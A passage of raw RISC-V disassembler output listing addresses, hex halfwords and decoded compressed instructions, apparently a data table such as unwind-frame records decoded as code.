 3e4:	0000                	unimp
 3e6:	0000                	unimp
 3e8:	0072                	c.slli	zero,0x1c
 3ea:	0000                	unimp
 3ec:	0000                	unimp
 3ee:	0000                	unimp
 3f0:	0e42                	slli	t3,t3,0x10
 3f2:	4420                	lw	s0,72(s0)
 3f4:	0281                	addi	t0,t0,0
 3f6:	0488                	addi	a0,sp,576
 3f8:	0c42                	slli	s8,s8,0x10
 3fa:	0008                	0x8
 3fc:	6402                	ld	s0,0(sp)
 3fe:	42c1                	li	t0,16
 400:	0cc8                	addi	a0,sp,596
 402:	2002                	fld	ft0,0(sp)
 404:	0e42                	slli	t3,t3,0x10
 406:	0000                	unimp
 408:	002c                	addi	a1,sp,8
 40a:	0000                	unimp
 40c:	00b8                	addi	a4,sp,72
 40e:	0000                	unimp
 410:	1d4a                	slli	s10,s10,0x32
 412:	8000                	0x8000
 414:	0000                	unimp
 416:	0000                	unimp
 418:	008e                	slli	ra,ra,0x3
 41a:	0000                	unimp
 41c:	0000                	unimp
 41e:	0000                	unimp
 420:	0e42                	slli	t3,t3,0x10
 422:	4440                	lw	s0,12(s0)
 424:	0281                	addi	t0,t0,0
 426:	0488                	addi	a0,sp,576
 428:	0c42                	slli	s8,s8,0x10
 42a:	0008                	0x8
 42c:	8002                	0x8002
 42e:	42c1                	li	t0,16
 430:	0cc8                	addi	a0,sp,596
 432:	4002                	0x4002
 434:	0e42                	slli	t3,t3,0x10
 436:	0000                	unimp
 438:	0034                	addi	a3,sp,8
 43a:	0000                	unimp
 43c:	00b8                	addi	a4,sp,72
 43e:	0000                	unimp
 440:	1dd8                	addi	a4,sp,756
 442:	8000                	0x8000
 444:	0000                	unimp
 446:	0000                	unimp
 448:	0102                	slli	sp,sp,0x0
 44a:	0000                	unimp
 44c:	0000                	unimp
 44e:	0000                	unimp
 450:	0e42                	slli	t3,t3,0x10
 452:	02d0                	addi	a2,sp,324
 454:	8144                	0x8144
 456:	8802                	jr	a6
 458:	4204                	lw	s1,0(a2)
 45a:	080c                	addi	a1,sp,16
 45c:	0200                	addi	s0,sp,256
 45e:	c1f4                	sw	a3,68(a1)
 460:	c842                	sw	a6,16(sp)
 462:	020c                	addi	a1,sp,256
 464:	02d0                	addi	a2,sp,324
 466:	0e42                	slli	t3,t3,0x10
	...
 470:	002c                	addi	a1,sp,8
 472:	0000                	unimp
 474:	00b8                	addi	a4,sp,72
 476:	0000                	unimp
 478:	1eda                	slli	t4,t4,0x36
 47a:	8000                	0x8000
 47c:	0000                	unimp
 47e:	0000                	unimp
 480:	006c                	addi	a1,sp,12
 482:	0000                	unimp
 484:	0000                	unimp
 486:	0000                	unimp
 488:	0e42                	slli	t3,t3,0x10
 48a:	4220                	lw	s0,64(a2)
 48c:	0288                	addi	a0,sp,320
 48e:	0c42                	slli	s8,s8,0x10
 490:	0008                	0x8
 492:	6202                	ld	tp,0(sp)
 494:	0cc8                	addi	a0,sp,596
 496:	2002                	fld	ft0,0(sp)
 498:	0e42                	slli	t3,t3,0x10
 49a:	0000                	unimp
 49c:	0000                	unimp
 49e:	0000                	unimp
 4a0:	002c                	addi	a1,sp,8
 4a2:	0000                	unimp
 4a4:	00b8                	addi	a4,sp,72
 4a6:	0000                	unimp
 4a8:	1f46                	slli	t5,t5,0x31
 4aa:	8000                	0x8000
 4ac:	0000                	unimp
 4ae:	0000                	unimp
 4b0:	0068                	addi	a0,sp,12
 4b2:	0000                	unimp
 4b4:	0000                	unimp
 4b6:	0000                	unimp
 4b8:	0e42                	slli	t3,t3,0x10
 4ba:	4220                	lw	s0,64(a2)
 4bc:	0288                	addi	a0,sp,320
 4be:	0c42                	slli	s8,s8,0x10
 4c0:	0008                	0x8
 4c2:	5e02                	lw	t3,32(sp)
 4c4:	0cc8                	addi	a0,sp,596
 4c6:	2002                	fld	ft0,0(sp)
 4c8:	0e42                	slli	t3,t3,0x10
 4ca:	0000                	unimp
 4cc:	0000                	unimp
 4ce:	0000                	unimp
 4d0:	0034                	addi	a3,sp,8
 4d2:	0000                	unimp
 4d4:	00b8                	addi	a4,sp,72
 4d6:	0000                	unimp
 4d8:	1fae                	slli	t6,t6,0x2b
 4da:	8000                	0x8000
 4dc:	0000                	unimp
 4de:	0000                	unimp
 4e0:	035e                	slli	t1,t1,0x17
 4e2:	0000                	unimp
 4e4:	0000                	unimp
 4e6:	0000                	unimp
 4e8:	0e42                	slli	t3,t3,0x10
 4ea:	4870                	lw	a2,84(s0)
 4ec:	0281                	addi	t0,t0,0
 4ee:	0488                	addi	a0,sp,576
 4f0:	0689                	addi	a3,a3,2
 4f2:	0892                	slli	a7,a7,0x4
 4f4:	0c42                	slli	s8,s8,0x10
 4f6:	0008                	0x8
 4f8:	c1034803          	lbu	a6,-1008(t1) # ffffffffffff9c10 <_end+0xffffffff7ffde750>
 4fc:	c842                	sw	a6,16(sp)
 4fe:	020c                	addi	a1,sp,256
 500:	4270                	lw	a2,68(a2)
 502:	42c9                	li	t0,18
 504:	42d2                	lw	t0,20(sp)
 506:	000e                	c.slli	zero,0x3
 508:	002c                	addi	a1,sp,8
 50a:	0000                	unimp
 50c:	00b8                	addi	a4,sp,72
 50e:	0000                	unimp
 510:	230c                	fld	fa1,0(a4)
 512:	8000                	0x8000
 514:	0000                	unimp
 516:	0000                	unimp
 518:	0056                	c.slli	zero,0x15
 51a:	0000                	unimp
 51c:	0000                	unimp
 51e:	0000                	unimp
 520:	0e42                	slli	t3,t3,0x10
 522:	4470                	lw	a2,76(s0)
 524:	1281                	addi	t0,t0,-32
 526:	1488                	addi	a0,sp,608
 528:	0c42                	slli	s8,s8,0x10
 52a:	4008                	lw	a0,0(s0)
 52c:	4802                	lw	a6,0(sp)
 52e:	42c1                	li	t0,16
 530:	0cc8                	addi	a0,sp,596
 532:	7002                	0x7002
 534:	0e42                	slli	t3,t3,0x10
 536:	0000                	unimp
 538:	002c                	addi	a1,sp,8
 53a:	0000                	unimp
 53c:	00b8                	addi	a4,sp,72
 53e:	0000                	unimp
 540:	2362                	fld	ft6,24(sp)
 542:	8000                	0x8000
 544:	0000                	unimp
 546:	0000                	unimp
 548:	0046                	c.slli	zero,0x11
 54a:	0000                	unimp
 54c:	0000                	unimp
 54e:	0000                	unimp
 550:	0e42                	slli	t3,t3,0x10
 552:	4240                	lw	s0,4(a2)
 554:	0288                	addi	a0,sp,320
 556:	0c42                	slli	s8,s8,0x10
 558:	0008                	0x8
 55a:	c87c                	sw	a5,84(s0)
 55c:	020c                	addi	a1,sp,256
 55e:	4240                	lw	s0,4(a2)
 560:	000e                	c.slli	zero,0x3
 562:	0000                	unimp
 564:	0000                	unimp
 566:	0000                	unimp
 568:	0034                	addi	a3,sp,8
 56a:	0000                	unimp
 56c:	00b8                	addi	a4,sp,72
 56e:	0000                	unimp
 570:	23a8                	fld	fa0,64(a5)
 572:	8000                	0x8000
 574:	0000                	unimp
 576:	0000                	unimp
 578:	00c2                	slli	ra,ra,0x10
 57a:	0000                	unimp
 57c:	0000                	unimp
 57e:	0000                	unimp
 580:	0e42                	slli	t3,t3,0x10
 582:	0290                	addi	a2,sp,320
 584:	8144                	0x8144
 586:	880e                	mv	a6,gp
 588:	4210                	lw	a2,0(a2)
 58a:	080c                	addi	a1,sp,16
 58c:	0230                	addi	a2,sp,264
 58e:	c1b4                	sw	a3,64(a1)
 590:	c842                	sw	a6,16(sp)
 592:	020c                	addi	a1,sp,256
 594:	0290                	addi	a2,sp,320
 596:	0e42                	slli	t3,t3,0x10
	...
 5a0:	002c                	addi	a1,sp,8
 5a2:	0000                	unimp
 5a4:	00b8                	addi	a4,sp,72
 5a6:	0000                	unimp
 5a8:	246a                	fld	fs0,152(sp)
 5aa:	8000                	0x8000
 5ac:	0000                	unimp
 5ae:	0000                	unimp
 5b0:	00b8                	addi	a4,sp,72
 5b2:	0000                	unimp
 5b4:	0000                	unimp
 5b6:	0000                	unimp
 5b8:	0e42                	slli	t3,t3,0x10
 5ba:	4250                	lw	a2,4(a2)
 5bc:	0288                	addi	a0,sp,320
 5be:	0c42                	slli	s8,s8,0x10
 5c0:	0008                	0x8
 5c2:	ae02                	fsd	ft0,280(sp)
 5c4:	0cc8                	addi	a0,sp,596
 5c6:	5002                	0x5002
 5c8:	0e42                	slli	t3,t3,0x10
 5ca:	0000                	unimp
 5cc:	0000                	unimp
 5ce:	0000                	unimp
 5d0:	002c                	addi	a1,sp,8
 5d2:	0000                	unimp
 5d4:	00b8                	addi	a4,sp,72
 5d6:	0000                	unimp
 5d8:	2522                	fld	fa0,8(sp)
 5da:	8000                	0x8000
 5dc:	0000                	unimp
 5de:	0000                	unimp
 5e0:	00ce                	slli	ra,ra,0x13
 5e2:	0000                	unimp
 5e4:	0000                	unimp
 5e6:	0000                	unimp
 5e8:	0e42                	slli	t3,t3,0x10
 5ea:	4250                	lw	a2,4(a2)
 5ec:	0288                	addi	a0,sp,320
 5ee:	0c42                	slli	s8,s8,0x10
 5f0:	0008                	0x8
 5f2:	c402                	sw	zero,8(sp)
 5f4:	0cc8                	addi	a0,sp,596
 5f6:	5002                	0x5002
 5f8:	0e42                	slli	t3,t3,0x10
 5fa:	0000                	unimp
 5fc:	0000                	unimp
 5fe:	0000                	unimp
 600:	002c                	addi	a1,sp,8
 602:	0000                	unimp
 604:	00b8                	addi	a4,sp,72
 606:	0000                	unimp
 608:	25f0                	fld	fa2,200(a1)
 60a:	8000                	0x8000
 60c:	0000                	unimp
 60e:	0000                	unimp
 610:	003c                	addi	a5,sp,8
 612:	0000                	unimp
 614:	0000                	unimp
 616:	0000                	unimp
 618:	0e42                	slli	t3,t3,0x10
 61a:	4230                	lw	a2,64(a2)
 61c:	0288                	addi	a0,sp,320
 61e:	0c42                	slli	s8,s8,0x10
 620:	0008                	0x8
 622:	c872                	sw	t3,16(sp)
 624:	020c                	addi	a1,sp,256
 626:	4230                	lw	a2,64(a2)
 628:	000e                	c.slli	zero,0x3
 62a:	0000                	unimp
 62c:	0000                	unimp
 62e:	0000                	unimp
 630:	002c                	addi	a1,sp,8
 632:	0000                	unimp
 634:	00b8                	addi	a4,sp,72
 636:	0000                	unimp
 638:	262c                	fld	fa1,72(a2)
 63a:	8000                	0x8000
 63c:	0000                	unimp
 63e:	0000                	unimp
 640:	004e                	c.slli	zero,0x13
 642:	0000                	unimp
 644:	0000                	unimp
 646:	0000                	unimp
 648:	0e42                	slli	t3,t3,0x10
 64a:	4230                	lw	a2,64(a2)
 64c:	0288                	addi	a0,sp,320
 64e:	0c42                	slli	s8,s8,0x10
 650:	0008                	0x8
 652:	4402                	lw	s0,0(sp)
 654:	0cc8                	addi	a0,sp,596
 656:	3002                	fld	ft0,32(sp)
 658:	0e42                	slli	t3,t3,0x10
 65a:	0000                	unimp
 65c:	0000                	unimp
 65e:	0000                	unimp
 660:	002c                	addi	a1,sp,8
 662:	0000                	unimp
 664:	00b8                	addi	a4,sp,72
 666:	0000                	unimp
 668:	267a                	fld	fa2,408(sp)
 66a:	8000                	0x8000
 66c:	0000                	unimp
 66e:	0000                	unimp
 670:	0070                	addi	a2,sp,12
 672:	0000                	unimp
 674:	0000                	unimp
 676:	0000                	unimp
 678:	0e42                	slli	t3,t3,0x10
 67a:	4230                	lw	a2,64(a2)
 67c:	0288                	addi	a0,sp,320
 67e:	0c42                	slli	s8,s8,0x10
 680:	0008                	0x8
 682:	6602                	ld	a2,0(sp)
 684:	0cc8                	addi	a0,sp,596
 686:	3002                	fld	ft0,32(sp)
 688:	0e42                	slli	t3,t3,0x10
 68a:	0000                	unimp
 68c:	0000                	unimp
 68e:	0000                	unimp
 690:	002c                	addi	a1,sp,8
 692:	0000                	unimp
 694:	00b8                	addi	a4,sp,72
 696:	0000                	unimp
 698:	26ea                	fld	fa3,152(sp)
 69a:	8000                	0x8000
 69c:	0000                	unimp
 69e:	0000                	unimp
 6a0:	004a                	c.slli	zero,0x12
 6a2:	0000                	unimp
 6a4:	0000                	unimp
 6a6:	0000                	unimp
 6a8:	0e42                	slli	t3,t3,0x10
 6aa:	4230                	lw	a2,64(a2)
 6ac:	0288                	addi	a0,sp,320
 6ae:	0c42                	slli	s8,s8,0x10
 6b0:	0008                	0x8
 6b2:	4002                	0x4002
 6b4:	0cc8                	addi	a0,sp,596
 6b6:	3002                	fld	ft0,32(sp)
 6b8:	0e42                	slli	t3,t3,0x10
 6ba:	0000                	unimp
 6bc:	0000                	unimp
 6be:	0000                	unimp
 6c0:	002c                	addi	a1,sp,8
 6c2:	0000                	unimp
 6c4:	00b8                	addi	a4,sp,72
 6c6:	0000                	unimp
 6c8:	2734                	fld	fa3,72(a4)
 6ca:	8000                	0x8000
 6cc:	0000                	unimp
 6ce:	0000                	unimp
 6d0:	00dc                	addi	a5,sp,68
 6d2:	0000                	unimp
 6d4:	0000                	unimp
 6d6:	0000                	unimp
 6d8:	0e42                	slli	t3,t3,0x10
 6da:	4230                	lw	a2,64(a2)
 6dc:	0288                	addi	a0,sp,320
 6de:	0c42                	slli	s8,s8,0x10
 6e0:	0008                	0x8
 6e2:	d202                	sw	zero,36(sp)
 6e4:	0cc8                	addi	a0,sp,596
 6e6:	3002                	fld	ft0,32(sp)
 6e8:	0e42                	slli	t3,t3,0x10
 6ea:	0000                	unimp
 6ec:	0000                	unimp
	...
